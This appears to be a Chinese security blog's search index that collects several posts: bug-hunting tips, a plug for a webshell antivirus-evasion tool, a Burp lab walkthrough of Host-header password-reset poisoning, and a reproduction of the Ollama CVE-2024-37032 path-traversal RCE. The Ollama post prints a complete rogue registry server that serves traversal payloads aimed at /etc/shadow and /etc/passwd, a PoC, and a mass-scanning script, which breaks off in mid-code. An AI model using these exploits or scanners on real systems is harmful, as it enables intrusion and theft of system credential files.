<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【基础知识】漏洞挖掘经验分享</title>
      <link href="/2025/05/24/Nouns-Vulnerability-mining/"/>
      <url>/2025/05/24/Nouns-Vulnerability-mining/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>我这里并不讲漏洞挖掘思路，而是漏洞挖掘经验分享。主要是协助小白上手漏洞挖掘，揭开漏洞挖掘的神秘面纱。帮助那些想挖漏洞却又挖不倒，感觉挖洞就是浪费时间、一听到挖洞还会感到莫名“恐惧”的小白同学。<strong>大佬路过勿喷，有想法的欢迎在下方留言！</strong></p><p>首先说一下漏洞挖掘的前提：</p><ol><li><strong>OWASP Top 10</strong> 漏洞基础必须要有，对应pikachu这种靶场；</li><li>逻辑漏洞挖掘基础，看些相关课程，认真做好笔记；</li><li>fofa、爱企查等高级API等，用于信息收集，非必须，有替代品或其他方式都可以；</li></ol><p>为什么不讲漏洞挖掘思路呢？因为现实的挖洞遇到的环境各不相同。比如各公众号分享那些漏洞挖掘的文章，在实战当中是不会有跟他一模一样的资产环境，除非是某个框架的nday，但如果只追求这种，那无非就是跑个脚本，做个脚本小子了。而且有<strong>OWASP Top 10</strong> 漏洞和逻辑漏洞挖掘思路完全是够用的，其他的无非就是挖洞姿势“骚不骚”。</p><h1 id="二、资产划分"><a href="#二、资产划分" class="headerlink" title="二、资产划分"></a>二、资产划分</h1><p>我们都知道资产收集的重要性，通过一堆工具去挖掘子域名、小程序等，是为了让我们收集到更多的资产，以便找到存在漏洞资产的薄弱点。包括在HW过程中，红队成员也是通过大量的资产收集，去挖掘目标的薄弱资产，进而发起攻击。</p><p>那么，我将收集到的资产划分三大类：一类资产、二类资产、三类资产，具体含义如下</p><table><thead><tr><th>资产等级</th><th>特点</th></tr></thead><tbody><tr><td>一类资产</td><td>静态站点</td></tr><tr><td>二类资产</td><td>有交互功能，但是无用户的站点</td></tr><tr><td>三类资产</td><td>有用户权限的站点</td></tr></tbody></table><p>我们对收集到的资产，首先去重、过存活之后，将剩下的资产划分以上三类，下面是对以上三类资产的打法经验。</p><h1 id="三、一类资产打法"><a href="#三、一类资产打法" class="headerlink" title="三、一类资产打法"></a>三、一类资产打法</h1><p>静态站点，比如我现在这个博客网站、各大官网站点，基本上没有交互功能，遇到这种站点直接跳过测试。</p><p>但是绝大部分的静态站点是伪静态，看上去是一个静态站点，没什么交互，但是点点列表、搜索框搜一搜，相关数据是传递到了后端，实现了交互功能；又或者通过目录扫描，扫描到了有交互功能的二级目录站点，那这种可以放在二类资产中。</p><p>因此一类资产在判断时要擦亮眼睛，究竟是一类资产，还是隐藏式的二类资产。同时，一旦确定为一类资产，测试过程中直接跳过测试。</p><h1 id="四、二类资产打法"><a href="#四、二类资产打法" class="headerlink" title="四、二类资产打法"></a>四、二类资产打法</h1><p>这种站点就是有交互功能，但是又没有用户权限的站点。最经典的就是常说的开局一个登录框。这里我要细分一下，因为二类资产是最常见的资产等级。</p><h2 id="1、无用户功能"><a href="#1、无用户功能" class="headerlink" title="1、无用户功能"></a>1、无用户功能</h2><p>就是这个系统有交互，但是没有用户登陆，权限划分这种。这种一般就对着交互功能测试就行，能做的事情也算比较局限，扫扫目录、测测交互、看看js代码这些，具体的做法看下面有用户功能处的内容。</p><p>这种也是有出洞的可能性，我之前测到过SQL注入。</p><p>除此之外还可以做资产升级，就是找用户权限的功能点，扫目录、看看 admin.php、&#x2F;admin 、&#x2F;login这些路径会不会出一个用户登录入口，变成有用户功能的站点资产。</p><h2 id="2、有用户功能"><a href="#2、有用户功能" class="headerlink" title="2、有用户功能"></a>2、有用户功能</h2><p>经典的开局一个登陆框，就是这类有用户功能的资产，但是咱们又没有用户的账号密码，进不去网站，我们在实战中遇到的资产70%以上都是这种。</p><p>这种情况下，需要扩大我们的信息面，能做的事情有：</p><ol><li>弱口令、SQL注入、SQL万能密码、用户名密码爆破</li><li>Google语法、社工搜索用户名密码、默认密码</li><li>扫目录，看有没有其他的功能界面</li><li>看JS代码，有没有敏感信息、api接口</li><li>如果有API接口路由，可以再测试未授权这种</li><li>逻辑漏洞相关测试，验证码、登陆绕过、短信轰炸那些</li><li>注册功能的利用，通过register关键字找注册点</li><li>指纹识别，如果使用了某个框架，查历史漏洞</li><li>fofa搜索同类型站点，观察有无隐藏的交互功能</li></ol><p>如果我们能通过注册用户、登陆绕过或者其他的方式进入站点内部，我们就可以提升资产到三类资产。</p><h1 id="五、三类资产打法"><a href="#五、三类资产打法" class="headerlink" title="五、三类资产打法"></a>五、三类资产打法</h1><p>当我们来到三类资产，也就是在这个站点上，我们是有用户权限的，这个时候我们能测的范围就很大了。站点内部有相当多的功能，起码的用户个人信息这块，头像上传、密码修改的相关功能就有很多测试点。一般用户站点都是区分管理员用户和非管理员用户，这里不展开区分，测试方法是一样的。</p><p>在实战当中，如果这个站点是外网资产，往往会有WAF或其他防护的安全措施，像SQL注入、XSS相关的payload很难打入。因此在三类资产中，我们更关注他的权限问题，像未授权、越权、敏感信息泄露之类的漏洞。当然，如果是内网没有防护措施的站点另说。</p><p>一般规模不小的站点，他的权限往往是会存在某些问题的。同时，我们在测试过程中，也不能仅仅局限于权限方面的测试，我们还需要主动的发散思维，去寻找更多的可能性，往往会带来更多的惊喜。</p><h1 id="六、结尾"><a href="#六、结尾" class="headerlink" title="六、结尾"></a>六、结尾</h1><p>当我们将收集到的资产做好资产等级的划分，会让我们对资产会有更加清晰的认知，在漏洞挖掘的过程中会更加的得心应手。如此往复一段时间，漏洞挖掘必然会更加的娴熟。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【免杀专栏】Webshell 持续免杀-XG_NTAI</title>
      <link href="/2025/05/03/Anti-AntiVirus-Webshell-XG-NTAI/"/>
      <url>/2025/05/03/Anti-AntiVirus-Webshell-XG-NTAI/</url>
      
        <content type="html"><![CDATA[<h1 id="一、XG-NTAI免杀介绍"><a href="#一、XG-NTAI免杀介绍" class="headerlink" title="一、XG_NTAI免杀介绍"></a>一、XG_NTAI免杀介绍</h1><p>用于Webshell木马免杀、流量加密传输</p><p>免杀冰蝎、哥斯拉等Webshell的ASP、PHP、JSP木马文件，生成冰蝎流量加密传输配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本工具仅用于授权测试，请勿用于非法用途</span><br></pre></td></tr></table></figure><p>该工具早在以前就有关注，那时候的XG_NTAI才到1.3版本，如今都更新到了2.5版本，地址：<a href="https://github.com/xiaogang000/XG_NTAI">xiaogang000&#x2F;XG_NTAI: 用于Webshell木马免杀、流量加密传输，多多支持star</a></p><h1 id="二、使用示例"><a href="#二、使用示例" class="headerlink" title="二、使用示例"></a>二、使用示例</h1><p>有空再搞</p>]]></content>
      
      
      <categories>
          
          <category> 免杀专栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Host头攻击</title>
      <link href="/2025/03/19/VulnRep-host-header-attack/"/>
      <url>/2025/03/19/VulnRep-host-header-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="零、Host头攻击简介"><a href="#零、Host头攻击简介" class="headerlink" title="零、Host头攻击简介"></a>零、Host头攻击简介</h1><p>如果服务器直接信任Host头，未校验它的合法性，则攻击者可能能够使用此可控变量来注入Host，以操纵服务器端的行为。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://_SERVER[&#x27;HOST&#x27;]/support&quot;&gt;联系支持&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>由于Host头实际上是用户可控制的，因此这种做法可能导致许多问题。如果未校验或者直接使用Host头，则Host头可以与一系列其他漏洞“组合拳”攻击，比如：</p><ul><li>缓存投毒</li><li>特殊业务功能的逻辑漏洞</li><li>基于路由的SSRF</li><li>经典服务端漏洞，如SQL注入（当Host被用于SQL语句时）等</li></ul><h1 id="一、密码重置中毒"><a href="#一、密码重置中毒" class="headerlink" title="一、密码重置中毒"></a>一、密码重置中毒</h1><p>来到<a href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning">Burp靶场</a>，我们知道一个用户<code>wiener:peter</code>，登陆靶场后可以看到自己的邮箱</p><p><img src="/img/VulnRep-host-header-attack/image-20250319172320908.png" alt="image-20250319172320908"></p><p>这里我们利用的是忘记密码的功能，我们需要退出登录之后，重置密码</p><p><img src="/img/VulnRep-host-header-attack/image-20250319172502735.png" alt="image-20250319172502735"></p><p>注意到Host地址是：<code>0ae700bf042376a285c94e25009000f7.web-security-academy.net</code></p><p>返回查看我们的邮箱：<a href="https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/email">https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/email</a></p><p><img src="/img/VulnRep-host-header-attack/image-20250319174405505.png" alt="image-20250319174405505"></p><p>我们尝试修改Host，放包到重放器，修改Host 头，放包查看邮箱</p><p><img src="/img/VulnRep-host-header-attack/image-20250319175205058.png" alt="image-20250319175205058"></p><p>可以看到，成功修改Host头</p><p><img src="/img/VulnRep-host-header-attack/image-20250319175235352.png" alt="image-20250319175235352"></p><p>我们修改Host头为我们自己的主机</p><p>主机地址：<a href="https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/">https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/</a></p><p><img src="/img/VulnRep-host-header-attack/image-20250319175839822.png" alt="image-20250319175839822"></p><p>并修改为受害人姓名</p><p><img src="/img/VulnRep-host-header-attack/image-20250319180157294.png" alt="image-20250319180157294"></p><p>之后查看我们的主机日志，成功拿到重置密码链接的token值</p><p><img src="/img/VulnRep-host-header-attack/image-20250319180323139.png" alt="image-20250319180323139"></p><p>之后修改重置密码链接的token值，之后就可以重置carlos 用户的密码，进而登陆该账户</p><p><img src="/img/VulnRep-host-header-attack/image-20250319181821957.png" alt="image-20250319181821957"></p><h1 id="二、Host头攻击-缓存投毒"><a href="#二、Host头攻击-缓存投毒" class="headerlink" title="二、Host头攻击+缓存投毒"></a>二、Host头攻击+缓存投毒</h1><p>有时间再复现</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Host头攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Ollama远程代码执行漏洞（CVE-2024-37032）</title>
      <link href="/2025/02/26/VulnRep-ollama/"/>
      <url>/2025/02/26/VulnRep-ollama/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Ollama简介"><a href="#一、Ollama简介" class="headerlink" title="一、Ollama简介"></a>一、Ollama简介</h1><p>Ollama是一个专为在本地环境中运行和定制大型语言模型而设计的工具。它提供了一个简单高效的接口，用于创建、运行和管理这些模型，同时还提供了一个丰富的预构建模型库，可以轻松集成到各种应用程序中。Ollama的目标是使大型语言模型的部署和交互变得简单，无论是对于开发者还是对于终端用户。</p><h1 id="二、Ollama远程代码执行漏洞（CVE-2024-37032）"><a href="#二、Ollama远程代码执行漏洞（CVE-2024-37032）" class="headerlink" title="二、Ollama远程代码执行漏洞（CVE-2024-37032）"></a>二、Ollama远程代码执行漏洞（CVE-2024-37032）</h1><p><strong>漏洞编号：CVE-2024-37032</strong> 该漏洞允许通过路径<a href="https://so.csdn.net/so/search?q=%E9%81%8D%E5%8E%86&spm=1001.2101.3001.7020">遍历</a>任意写入文件。digest字段的验证不正确，服务器错误地将有效负载解释为合法的文件路径，攻击者可在digest字段中包含路径遍历payload的恶意清单文件，利用该漏洞实现任意文件读取&#x2F;写入或导致远程代码执行。</p><h1 id="三、影响版本"><a href="#三、影响版本" class="headerlink" title="三、影响版本"></a>三、影响版本</h1><p>Ollama &lt; 0.1.34</p><h1 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h1><h2 id="1、第一步：搭建环境"><a href="#1、第一步：搭建环境" class="headerlink" title="1、第一步：搭建环境"></a>1、第一步：搭建环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama:0.1.33</span><br></pre></td></tr></table></figure><h2 id="2、第二步：开启Rogue-registry-server"><a href="#2、第二步：开启Rogue-registry-server" class="headerlink" title="2、第二步：开启Rogue registry server"></a>2、第二步：开启Rogue registry server</h2><p>在云服务器开启server.py 文件，vps改成服务器的IP地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from fastapi import FastAPI, Request, Response</span><br><span class="line"></span><br><span class="line">HOST = &quot;vps&quot;</span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">async def index_get():</span><br><span class="line">    return &#123;&quot;message&quot;: &quot;Hello rogue server&quot;&#125;</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/&quot;)</span><br><span class="line">async def index_post(callback_data: Request):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    return &#123;&quot;message&quot;: &quot;Hello rogue server&quot;&#125;</span><br><span class="line"></span><br><span class="line"># for ollama pull</span><br><span class="line">@app.get(&quot;/v2/rogue/bi0x/manifests/latest&quot;)</span><br><span class="line">async def fake_manifests():</span><br><span class="line">    return &#123;&quot;schemaVersion&quot;:2,&quot;mediaType&quot;:&quot;application/vnd.docker.distribution.manifest.v2+json&quot;,&quot;config&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.docker.container.image.v1+json&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/shadow&quot;,&quot;size&quot;:10&#125;,&quot;layers&quot;:[&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../../../../../../../tmp/notfoundfile&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.docker.distribution.manifest.v2+json&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/passwd&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:f&quot;../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;,&quot;size&quot;:10&#125;]&#125;</span><br><span class="line"></span><br><span class="line">@app.head(&quot;/etc/passwd&quot;)</span><br><span class="line">async def fake_passwd_head(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/etc/passwd&quot;, status_code=206)</span><br><span class="line">async def fake_passwd_get(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    response.headers[&quot;E-Tag&quot;] = &quot;\&quot;../../../../../../../../../../../../../etc/passwd\&quot;&quot;</span><br><span class="line">    return &#x27;cve-2024-37032-test&#x27;</span><br><span class="line"></span><br><span class="line">@app.head(f&quot;/root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;)</span><br><span class="line">async def fake_latest_head(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.get(f&quot;/root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;, status_code=206)</span><br><span class="line">async def fake_latest_get(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest&quot;</span><br><span class="line">    response.headers[&quot;E-Tag&quot;] = &quot;\&quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest\&quot;&quot;</span><br><span class="line">    return &#123;&quot;schemaVersion&quot;:2,&quot;mediaType&quot;:&quot;application/vnd.docker.distribution.manifest.v2+json&quot;,&quot;config&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.docker.container.image.v1+json&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/shadow&quot;,&quot;size&quot;:10&#125;,&quot;layers&quot;:[&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../../../../../../../tmp/notfoundfile&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/passwd&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:f&quot;../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;,&quot;size&quot;:10&#125;]&#125;</span><br><span class="line"></span><br><span class="line">@app.head(&quot;/tmp/notfoundfile&quot;)</span><br><span class="line">async def fake_notfound_head(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../tmp/notfoundfile&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/tmp/notfoundfile&quot;, status_code=206)</span><br><span class="line">async def fake_notfound_get(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../tmp/notfoundfile&quot;</span><br><span class="line">    response.headers[&quot;E-Tag&quot;] = &quot;\&quot;../../../../../../../../../../../../../tmp/notfoundfile\&quot;&quot;</span><br><span class="line">    return &#x27;cve-2024-37032-test&#x27;</span><br><span class="line"></span><br><span class="line"># for ollama push</span><br><span class="line">@app.post(&quot;/v2/rogue/bi0x/blobs/uploads/&quot;, status_code=202)</span><br><span class="line">async def fake_upload_post(callback_data: Request, response: Response):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    response.headers[&quot;Docker-Upload-Uuid&quot;] = &quot;3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span><br><span class="line">    response.headers[&quot;Location&quot;] = f&quot;http://&#123;HOST&#125;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.patch(&quot;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04&quot;, status_code=202)</span><br><span class="line">async def fake_patch_file(callback_data: Request):</span><br><span class="line">    print(&#x27;patch&#x27;)</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04&quot;, status_code=202)</span><br><span class="line">async def fake_post_file(callback_data: Request):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.put(&quot;/v2/rogue/bi0x/manifests/latest&quot;)</span><br><span class="line">async def fake_manifests_put(callback_data: Request, response: Response):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    response.headers[&quot;Docker-Upload-Uuid&quot;] = &quot;3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span><br><span class="line">    response.headers[&quot;Location&quot;] = f&quot;http://&#123;HOST&#125;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    import uvicorn</span><br><span class="line">    uvicorn.run(app, host=&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></figure><h2 id="3、第三步：执行恶意攻击"><a href="#3、第三步：执行恶意攻击" class="headerlink" title="3、第三步：执行恶意攻击"></a>3、第三步：执行恶意攻击</h2><p>运行如下poc.py 脚本，vps 与上面vps的IP保持一致，target_url 是要攻击的ollama服务器地址。注意：vps 与 target_url 最好不要放置在同一个服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">HOST = &quot;vps&quot;</span><br><span class="line">target_url = &quot;http://target_url&quot;</span><br><span class="line"></span><br><span class="line">vuln_registry_url = &quot;vps/rogue/bi0x&quot;</span><br><span class="line"></span><br><span class="line">pull_url = f&quot;&#123;target_url&#125;/api/pull&quot;</span><br><span class="line">push_url = f&quot;&#123;target_url&#125;/api/push&quot;</span><br><span class="line"></span><br><span class="line">requests.post(pull_url, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line">requests.post(push_url, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line"># see rogue server log</span><br></pre></td></tr></table></figure><p>执行之后，看server.py 的执行结果</p><h1 id="五、漏洞批量检测"><a href="#五、漏洞批量检测" class="headerlink" title="五、漏洞批量检测"></a>五、漏洞批量检测</h1><p>1、server.py 原样不变，保持执行</p><p>2、将需要检测的url放置在urls.txt 文件中，注意加http</p><p>3、运行如下 pocs.py 脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import urllib3</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"># 读取URL的文本文件名</span><br><span class="line">urls_file = &quot;urls.txt&quot;</span><br><span class="line"></span><br><span class="line"># 主机名和漏洞注册URL</span><br><span class="line">HOST = &quot;vps&quot;</span><br><span class="line">vuln_registry_url = f&quot;&#123;HOST&#125;/rogue/bi0x&quot;</span><br><span class="line"></span><br><span class="line">proxys = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print_lock = threading.Lock()  # 创建一个锁对象</span><br><span class="line"></span><br><span class="line">def readtxt():</span><br><span class="line">    lines = []</span><br><span class="line"></span><br><span class="line">    with open(urls_file, &#x27;r&#x27;) as f:</span><br><span class="line">        # 读取所有行内容，并去除左右空白</span><br><span class="line">        for line in f.readlines():</span><br><span class="line">            # 判断最后是不是/，若是则去除</span><br><span class="line">            if line.endswith(&#x27;/&#x27;):</span><br><span class="line">                line = line[:-1]</span><br><span class="line"></span><br><span class="line">            # 判断line前面有没有http</span><br><span class="line">            if not line.startswith(&#x27;http&#x27;):</span><br><span class="line">                # 如果没有，则添加http://</span><br><span class="line">                line1 = &#x27;http://&#x27; + line</span><br><span class="line">                line2 = &#x27;https://&#x27; + line</span><br><span class="line">                lines.append(line1.strip())</span><br><span class="line">                lines.append(line2.strip())</span><br><span class="line">            else:</span><br><span class="line">                lines.append(line.strip())</span><br><span class="line">    return lines</span><br><span class="line"></span><br><span class="line">def check_vulnerability(line):</span><br><span class="line">    # 目标URL</span><br><span class="line">    target_url = line</span><br><span class="line"></span><br><span class="line">    # 构建API端点URL</span><br><span class="line">    pull_url = f&quot;&#123;target_url&#125;/api/pull&quot;</span><br><span class="line">    push_url = f&quot;&#123;target_url&#125;/api/push&quot;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # 发送POST请求</span><br><span class="line">        response_pull = requests.post(pull_url, proxies=proxys, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line">        response_push = requests.post(push_url, proxies=proxys, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line">        if response_pull.status_code == 200 and response_push.status_code == 200:</span><br><span class="line">            with print_lock:</span><br><span class="line">                with open(&quot;resutls.txt&quot;, &quot;a&quot;) as f:</span><br><span class="line">                    f.write(f&quot;&#123;target_url&#125;\n&quot;)</span><br><span class="line">                    # 进行红色输出</span><br><span class="line">                    print(&quot;\033[31m&quot; + f&quot;[+] &#123;target_url&#125; 可能存在漏洞(具体看server日志)&quot; + &quot;\033[0m&quot;)</span><br><span class="line">        else:</span><br><span 